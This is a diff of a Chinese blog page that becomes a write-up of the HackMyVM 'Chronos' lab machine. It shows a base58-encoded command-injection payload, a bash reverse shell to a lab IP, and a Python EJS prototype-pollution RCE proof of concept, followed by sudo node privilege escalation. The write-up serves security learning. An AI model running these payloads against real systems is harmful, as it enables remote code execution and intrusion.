@@ -9,6 +9,8 @@
     
     <title>
         
+            hackmyvm Chronos复盘 |
+        
         Flowww&#39;s blog
     </title>
     
@@ -55,10 +57,10 @@
     
 
     <!-- page content -->
-    <div class="page-main-content border-box is-home">
+    <div class="page-main-content border-box">
         <div class="page-main-content-top">
             
-<header class="header-wrapper transparent-1">
+<header class="header-wrapper">
 
     <div class="border-box header-content">
         <div class="left border-box">
@@ -180,45 +182,48 @@
             <div class="main-content border-box">
                 
 
-                    <div class="home-content-container fade-in-down-animation">
-    
-    <ul class="home-post-list border-box">
-        
-            <li class="home-post-item">
+                    
+<div class="fade-in-down-animation">
+    <div class="post-page-container border-box">
+        <div class="post-content-container border-box">
+            
 
+            <div class="post-content-bottom border-box">
+                
+                    <div class="post-title">
+                        hackmyvm Chronos复盘
+                    </div>
                 
 
-                <div class="home-post-item-bottom border-box">
-                    
-                    <h3 class="home-post-title border-box">
-                        <a href="/2024/03/18/hackmyvm-casino%E5%A4%8D%E7%9B%98/">
-                            hackmyvm casino复盘
-                        </a>
-                    </h3>
-
-                    <div class="home-post-content keep-markdown-body">
+                
+                    <div class="post-header border-box">
                         
-                            靶机信息地址：https://hackmyvm.eu/machines/machine.php?vm=Casino
-难度：medium
-靶机ip：192.168.64.82
-信息收集端口扫描扫到22和80端口
-
-先到80端口，有个登陆页面，不知道账号...
+                            <div class="avatar-box border-box">
+                                <img src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/aaa.png">
+                            </div>
                         
-                    </div>
+                        <div class="info-box">
+                            <div class="author border-box">
+                                <span class="name">FLow</span>
+                                
+                            </div>
+                            <div class="meta-info border-box">
+                                
 
-                    
-
-<div class="post-meta-info-container border-box home">
+<div class="post-meta-info-container border-box post">
     <div class="post-meta-info border-box">
         
-            <span class="meta-info-item border-box">
-                <i class="icon fa-solid fa-file-circle-plus"></i>&nbsp;<span class="home-post-history"
-                                                                                data-updated="Mon Mar 18 2024 16:47:41 GMT+0800"
-                >2024-03-18 16:47:41</span>
-            </span>
-        
 
+        
+            <span class="meta-info-item post-create-date">
+                <i class="icon fa-solid fa-calendar-plus"></i>&nbsp;
+                <span class="datetime">2024-06-21</span>
+            </span>
+
+            <span class="meta-info-item post-update-date">
+                <i class="icon fa-solid fa-file-pen"></i>&nbsp;
+                <span class="datetime" data-updated="Sun Jun 23 2024 11:07:59 GMT+0800">2024-06-23</span>
+            </span>
         
 
         
@@ -226,16 +231,10 @@
         
             <span class="post-tag meta-info-item border-box">
                 <ul class="post-tag-ul">
-                    
-                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/hackmyvm/">hackmyvm</a></li>
-                        
                     
                             <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/%E5%A4%8D%E7%9B%98/">复盘</a></li>
                         
                     
-                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/linux/">linux</a></li>
-                        
-                    
                 </ul>
             </span>
         
@@ -244,315 +243,131 @@
         
         
         
+            <span class="meta-info-item post-pv">
+                <i class="icon fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+            </span>
+        
     </div>
 
     
-        <a class="home-read-more" href="/2024/03/18/hackmyvm-casino%E5%A4%8D%E7%9B%98/">阅读全文&nbsp;<i class="icon fas fa-angle-right"></i></a>
-    
 </div>
 
+                            </div>
+                        </div>
+                    </div>
+                
+
+                <div class="post-content keep-markdown-body">
+                    
+
+                    <h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>一个考验细心的靶场，我还挺被卡的，也是给我一个教训，写复盘主要是记录回顾，做出来主要还是参考了大佬的wp，写完wp还是意识到自己基础太弱，希望暑假能静下心好好补基础</p>
+<p>主要参考：</p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://al1enum.github.io/docs/Chronos.pdf" >https://al1enum.github.io/docs/Chronos.pdf<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV15o4y1z73N/?vd_source=04ff153ff0b36e8676b4638902ed9f4b" >https://www.bilibili.com/video/BV15o4y1z73N/?vd_source=04ff153ff0b36e8676b4638902ed9f4b<i class="fas fa-external-link-alt"></i></a> （讲的很细，推荐）</p>
+<h4 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h4><p>前期看到开了22，80，8000端口，先看80和8000</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240621174335.png" ></p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240621174353.png" ></p>
+<p>最开始拿到两个网页，内容差不多，查看源代码也没看到什么新东西，扫了很久目录扫到一个&#x2F;date，访问之后是一些报错，暂时对我没什么帮助，这个时候我就被卡住了。。。。</p>
+<p>然后我就看了wp提示，要观察访问网站的请求包</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240621174604.png" ></p>
+<p>可以看到这里有个域名，要编辑一下&#x2F;etc&#x2F;hosts了，再访问</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240621174835.png" ></p>
+<p>主要到&#x2F;data?format&#x3D;有一段内容，尝试拿去解码</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240621174930.png" ></p>
+<p>base58解码后发现这是一个显示时间的命令，至于为什么会Permission Denied，经过研究，发现是请求包的缺少了特定的ua头（正常抓包能发现是有的）<strong>（后来发现网站源码有一段被混淆的代码，解混淆后也能知道要求有特定ua头才能执行代码）</strong></p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240621175416.png" ></p>
+<p>于是加上之后才能正确看到时间</p>
+<img     src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240621175458.png"   style="zoom:50%;" >
+
+<h4 id="功能点利用"><a href="#功能点利用" class="headerlink" title="功能点利用"></a>功能点利用</h4><p>知道有这个功能点，可以尝试命令注入，format参数接收命令，于是尝试</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">;bash -c &#x27;/bin/bash -i &gt;&amp; /dev/tcp/192.168.64.3/8888 0&gt;&amp;1&#x27;</span><br><span class="line">base58编码：YLAX9KhLnbeXJEfvdxJCU6qbixB1RzHhWDZ87VijVMTAtiYpjwpV2jJXtqZBGQg1uLKckNVQHium3Ca</span><br></pre></td></tr></table></figure>
+
+<p>成功反弹到shell</p>
+<h4 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h4><p>看了一下靶机开放的端口</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240623102311.png" ></p>
+<p>发现内网还开了一个8080端口，curl一下</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240623105206.png" ></p>
+<p>发现有Chronos version2，回到上一级目录，有一个chronos-v2，看一下代码</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240623105320.png" ></p>
+<p>ejs库使用<code>express-fileupload</code>来处理文件上传，有一个利用原型链污染的poc（还不是很懂原理）可以直接用</p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://github.com/boiledsteak/EJS-Exploit/blob/main/attacker/EJS-RCE-attack.py" >https://github.com/boiledsteak/EJS-Exploit/blob/main/attacker/EJS-RCE-attack.py<i class="fas fa-external-link-alt"></i></a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">### commands to run on victim machine</span><br><span class="line">cmd = &#x27;bash -c &quot;bash -i &amp;&gt; /dev/tcp/192.168.64.3/1234 0&gt;&amp;1&quot;&#x27;</span><br><span class="line"></span><br><span class="line">print(&quot;Starting Attack...&quot;)</span><br><span class="line">### pollute</span><br><span class="line">requests.post(&#x27;http://127.0.0.1:8080&#x27;, files = &#123;&#x27;__proto__.outputFunctionName&#x27;: (</span><br><span class="line">    None, f&quot;x;console.log(1);process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;&#123;cmd&#125;&#x27;);x&quot;)&#125;)</span><br><span class="line"></span><br><span class="line">### execute command</span><br><span class="line">requests.get(&#x27;http://127.0.0.1:8080&#x27;)</span><br><span class="line">print(&quot;Finished!&quot;)</span><br></pre></td></tr></table></figure>
+
+<p>执行这个poc就能得到imera的shell</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240623110405.png" ></p>
+<p>然后sudo -l就能看到有node和npm可以用</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240623110430.png" ></p>
+<p>直接gtfobins利用node一把梭，提权成功，结束</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240623110532.png" ></p>
+
                 </div>
-            </li>
-        
-            <li class="home-post-item">
+                
+
+                <div class="post-bottom-tags-and-share border-box">
+                    <div>
+                        
+                            <ul class="post-tags-box border-box">
+                                
+                                    <li class="tag-item border-box">
+                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/%E5%A4%8D%E7%9B%98/">复盘</a>
+                                    </li>
+                                
+                            </ul>
+                        
+                    </div>
+                    <div>
+                        
+                    </div>
+                </div>
 
                 
 
-                <div class="home-post-item-bottom border-box">
-                    
-                    <h3 class="home-post-title border-box">
-                        <a href="/2024/03/18/hackmyvm-djinn%E5%A4%8D%E7%9B%98/">
-                            hackmyvm djinn复盘
-                        </a>
-                    </h3>
-
-                    <div class="home-post-content keep-markdown-body">
+                
+                    <div class="post-nav border-box">
                         
-                            靶机信息地址：https://hackmyvm.eu/machines/?v=djin
-难度：easy
-信息收集端口扫描，扫到21，1337，7331开放，先用anonymous作为账号密码登陆21号端口，有三个txt文件，下载来看看
-
-game里面...
+                        
+                            <div class="next-post">
+                                <a class="next"
+                                   rel="next"
+                                   href="/2024/06/20/hackmyvm-government%E5%A4%8D%E7%9B%98/"
+                                   title="hackmyvm government复盘"
+                                >
+                                    <span class="title flex-center">
+                                        <span class="post-nav-title-item text-ellipsis">hackmyvm government复盘</span>
+                                        <span class="post-nav-item">下一篇</span>
+                                    </span>
+                                    <span class="right arrow-icon flex-center">
+                                        <i class="fas fa-chevron-right"></i>
+                                    </span>
+                                </a>
+                            </div>
                         
                     </div>
-
-                    
-
-<div class="post-meta-info-container border-box home">
-    <div class="post-meta-info border-box">
-        
-            <span class="meta-info-item border-box">
-                <i class="icon fa-solid fa-file-circle-plus"></i>&nbsp;<span class="home-post-history"
-                                                                                data-updated="Mon Mar 18 2024 10:41:46 GMT+0800"
-                >2024-03-18 10:41:46</span>
-            </span>
-        
-
-        
-
-        
-
-        
-            <span class="post-tag meta-info-item border-box">
-                <ul class="post-tag-ul">
-                    
-                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/hackmyvm/">hackmyvm</a></li>
-                        
-                    
-                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/%E5%A4%8D%E7%9B%98/">复盘</a></li>
-                        
-                    
-                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/linux/">linux</a></li>
-                        
-                    
-                </ul>
-            </span>
-        
-
-        
-        
-        
-        
-    </div>
-
-    
-        <a class="home-read-more" href="/2024/03/18/hackmyvm-djinn%E5%A4%8D%E7%9B%98/">阅读全文&nbsp;<i class="icon fas fa-angle-right"></i></a>
-    
-</div>
-
-                </div>
-            </li>
-        
-            <li class="home-post-item">
-
                 
 
-                <div class="home-post-item-bottom border-box">
-                    
-                    <h3 class="home-post-title border-box">
-                        <a href="/2024/03/16/hackmyvm%E5%A4%8D%E7%9B%98%E5%90%88%E9%9B%861/">
-                            hackmyvm 复盘合集1
-                        </a>
-                    </h3>
-
-                    <div class="home-post-content keep-markdown-body">
-                        
-                            translator来到80端口看到有个translator的界面，随便输了abc，返回zyx，试了几次确认加密逻辑就是一对一替换，a-z，b-y这样，但是数字和大写字母是不会变的，扫了目录也没看到有什么东西
-
-然后看了wp才知道，这个输入框可以命令...
-                        
-                    </div>
-
+                
                     
 
-<div class="post-meta-info-container border-box home">
-    <div class="post-meta-info border-box">
-        
-            <span class="meta-info-item border-box">
-                <i class="icon fa-solid fa-file-circle-plus"></i>&nbsp;<span class="home-post-history"
-                                                                                data-updated="Sat Mar 16 2024 18:12:28 GMT+0800"
-                >2024-03-16 18:12:28</span>
-            </span>
-        
 
-        
 
-        
 
-        
-            <span class="post-tag meta-info-item border-box">
-                <ul class="post-tag-ul">
-                    
-                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/hackmyvm/">hackmyvm</a></li>
-                        
-                    
-                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/%E5%A4%8D%E7%9B%98/">复盘</a></li>
-                        
-                    
-                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/linux/">linux</a></li>
-                        
-                    
-                </ul>
-            </span>
-        
 
-        
-        
-        
-        
-    </div>
-
-    
-        <a class="home-read-more" href="/2024/03/16/hackmyvm%E5%A4%8D%E7%9B%98%E5%90%88%E9%9B%861/">阅读全文&nbsp;<i class="icon fas fa-angle-right"></i></a>
-    
-</div>
-
-                </div>
-            </li>
-        
-            <li class="home-post-item">
 
                 
-
-                <div class="home-post-item-bottom border-box">
-                    
-                    <h3 class="home-post-title border-box">
-                        <a href="/2024/03/15/new/index/">
-                            hackmyvm first 复盘
-                        </a>
-                    </h3>
-
-                    <div class="home-post-content keep-markdown-body">
-                        
-                            基础信息12靶机ip 192.168.64.75攻击机ip 192.168.64.3
-
-信息搜集扫描到3个端口，21端口，22端口和80端口
-
-
-80端口看不到什么内容
-
-nmap扫出来ftp端口有几个文件夹，登陆看看
-1ftp 192.168.64...
-                        
-                    </div>
-
-                    
-
-<div class="post-meta-info-container border-box home">
-    <div class="post-meta-info border-box">
-        
-            <span class="meta-info-item border-box">
-                <i class="icon fa-solid fa-file-circle-plus"></i>&nbsp;<span class="home-post-history"
-                                                                                data-updated="Fri Mar 15 2024 17:06:28 GMT+0800"
-                >2024-03-15 17:06:28</span>
-            </span>
-        
-
-        
-
-        
-
-        
-            <span class="post-tag meta-info-item border-box">
-                <ul class="post-tag-ul">
-                    
-                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/blog/">blog</a></li>
-                        
-                    
-                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/hackmyvm/">hackmyvm</a></li>
-                        
-                    
-                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/%E5%AD%A6%E4%B9%A0/">学习</a></li>
-                        
-                    
-                </ul>
-            </span>
-        
-
-        
-        
-        
-        
-    </div>
-
-    
-        <a class="home-read-more" href="/2024/03/15/new/index/">阅读全文&nbsp;<i class="icon fas fa-angle-right"></i></a>
-    
-</div>
-
-                </div>
-            </li>
-        
-            <li class="home-post-item">
-
-                
-
-                <div class="home-post-item-bottom border-box">
-                    
-                    <h3 class="home-post-title border-box">
-                        <a href="/2024/03/15/hello-world/">
-                            Hello World
-                        </a>
-                    </h3>
-
-                    <div class="home-post-content keep-markdown-body">
-                        
-                            一个开始。
-
-                        
-                    </div>
-
-                    
-
-<div class="post-meta-info-container border-box home">
-    <div class="post-meta-info border-box">
-        
-            <span class="meta-info-item border-box">
-                <i class="icon fa-solid fa-file-circle-plus"></i>&nbsp;<span class="home-post-history"
-                                                                                data-updated="Fri Mar 15 2024 15:28:11 GMT+0800"
-                >2024-03-15 15:28:11</span>
-            </span>
-        
-
-        
-
-        
-
-        
-            <span class="post-tag meta-info-item border-box">
-                <ul class="post-tag-ul">
-                    
-                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/blog/">blog</a></li>
-                        
-                    
-                </ul>
-            </span>
-        
-
-        
-        
-        
-        
-    </div>
-
-    
-        <a class="home-read-more" href="/2024/03/15/hello-world/">阅读全文&nbsp;<i class="icon fas fa-angle-right"></i></a>
-    
-</div>
-
-                </div>
-            </li>
-        
-    </ul>
-    
-    <div class="paginator border-box flex-center">
-        <div class="btn-wrap allowed">
-            <a class="jump-btn"
-               href="/page/2/"
-            ><i class="fa-solid fa-chevron-left"></i></a>
+            </div>
         </div>
 
-
-        <div class="page-number-box border-box flex-center">
-            <input class="page-number-input border-box base-color-size"
-                   type="number"
-                   value="3"
-                   min="1"
-                   max="3"
-            ><span class="delimiter base-color-size">/</span><span class="base-color-size">3</span>
-        </div>
-
-
-        <div class="btn-wrap">
-            <a class="jump-btn"
-               href="/"
-            ><i class="fa-solid fa-chevron-right"></i></a>
-        </div>
+        
+            <div class="pc-post-toc right-toc">
+                <div class="post-toc-wrap border-box">
+    <div class="post-toc border-box">
+        <ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="nav-number">2.</span> <span class="nav-text">信息搜集</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8A%9F%E8%83%BD%E7%82%B9%E5%88%A9%E7%94%A8"><span class="nav-number">3.</span> <span class="nav-text">功能点利用</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%8F%90%E6%9D%83"><span class="nav-number">4.</span> <span class="nav-text">提权</span></a></li></ol>
     </div>
+</div>
 
-
-
-
+            </div>
+        
+    </div>
 </div>
 
 
@@ -596,10 +411,32 @@ nmap扫出来ftp端口有几个文件夹，登陆看看
 
     <!-- post tools -->
     
+        <div class="post-tools right-toc">
+            <div class="post-tools-container border-box">
+    <ul class="tools-list border-box">
+        <!-- PC TOC show toggle -->
+        
+            <li class="tools-item flex-center toggle-show-toc">
+                <i class="fas fa-list"></i>
+            </li>
+        
+
+        <!-- PC go comment -->
+        
+
+        <!-- PC full screen -->
+        <li class="tools-item flex-center full-screen">
+            <i class="fa-solid fa-expand"></i>
+        </li>
+    </ul>
+</div>
+
+        </div>
+    
 
     <!-- side tools -->
     <div class="side-tools">
-        <div class="side-tools-container border-box side-tools-show-handle">
+        <div class="side-tools-container border-box ">
     <ul class="side-tools-list side-tools-show-handle border-box">
         <li class="tools-item tool-font-adjust-plus flex-center">
             <i class="fas fa-search-plus"></i>
@@ -622,6 +459,10 @@ nmap扫出来ftp端口有几个文件夹，登陆看看
     </ul>
 
     <ul class="exposed-tools-list border-box">
+        
+            <li class="tools-item toggle-show-toc-tablet flex-center">
+                <i class="fas fa-list"></i>
+            </li>
         
 
         
@@ -679,8 +520,18 @@ nmap扫出来ftp端口有几个文件夹，登陆看看
 
     <!-- tablet toc -->
     
-</main>
+        <div class="tablet-post-toc-mask">
+            <div class="tablet-post-toc">
+                <div class="post-toc-wrap border-box">
+    <div class="post-toc border-box">
+        <ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="nav-number">2.</span> <span class="nav-text">信息搜集</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8A%9F%E8%83%BD%E7%82%B9%E5%88%A9%E7%94%A8"><span class="nav-number">3.</span> <span class="nav-text">功能点利用</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%8F%90%E6%9D%83"><span class="nav-number">4.</span> <span class="nav-text">提权</span></a></li></ol>
+    </div>
+</div>
 
+            </div>
+        </div>
+    
+</main>
 
 
 
@@ -712,6 +563,24 @@ nmap扫出来ftp端口有几个文件夹，登陆看看
 
 
 <div class="">
+    
+        <!-- post-helper -->
+        
+<script src="/js/post/post-helper.js"></script>
+
+
+        <!-- toc -->
+        
+            
+<script src="/js/post/toc.js"></script>
+
+        
+
+        <!-- copyright-info -->
+        
+
+        <!-- share -->
+        
     
 
     <!-- categories page -->
